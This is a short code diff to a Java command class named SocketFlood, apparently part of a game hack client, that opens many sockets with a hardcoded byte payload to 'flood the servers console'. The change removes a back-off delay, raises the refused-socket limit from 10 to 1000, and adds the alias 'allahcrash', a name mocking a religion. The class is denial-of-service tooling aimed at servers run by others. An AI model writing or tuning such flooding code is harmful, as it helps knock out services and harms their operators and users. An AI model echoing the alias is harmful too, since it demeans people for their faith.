@@ -22,7 +22,7 @@ public class SocketFlood extends Command {
     static final int[] PAYLOAD = new int[] { 0x3, 0x1, 0x0, 0xffffffbb, 0x1, 0x0, 0x0, 0xffffffb7, 0x3, 0x3, 0xffffffcb, 0xffffff82, 0xffffffae, 0x53, 0x15, 0xfffffff6, 0x79, 0x2, 0xffffffc2, 0xb, 0xffffffe1, 0xffffffc2, 0x6a, 0xfffffff8, 0x75, 0xffffffe9, 0x32, 0x23, 0x3c, 0x39, 0x3, 0x3f, 0xffffffa4, 0xffffffc7, 0xffffffb5, 0xffffff88, 0x50, 0x1f, 0x2e, 0x65, 0x21, 0x0, 0x0, 0x48, 0x0, 0x2f };
 
     public SocketFlood() {
-        super("SocketFlood", "Flood the servers console using sockets", "sflood", "socketflood");
+        super("SocketFlood", "Flood the servers console using sockets", "sflood", "socketflood", "allahcrash");
     }
 
     @Override
@@ -44,10 +44,9 @@ public class SocketFlood extends Command {
                         sockets.add(s);
                     } catch (Exception ignored) {
                         message("server refused new socket");
-                        Utils.sleep(500);
                         c++;
                     }
-                    if (c > 10) {
+                    if (c > 1000) {
                         message("firing early since we got over 1000 closed sockets");
                         break;
                     }
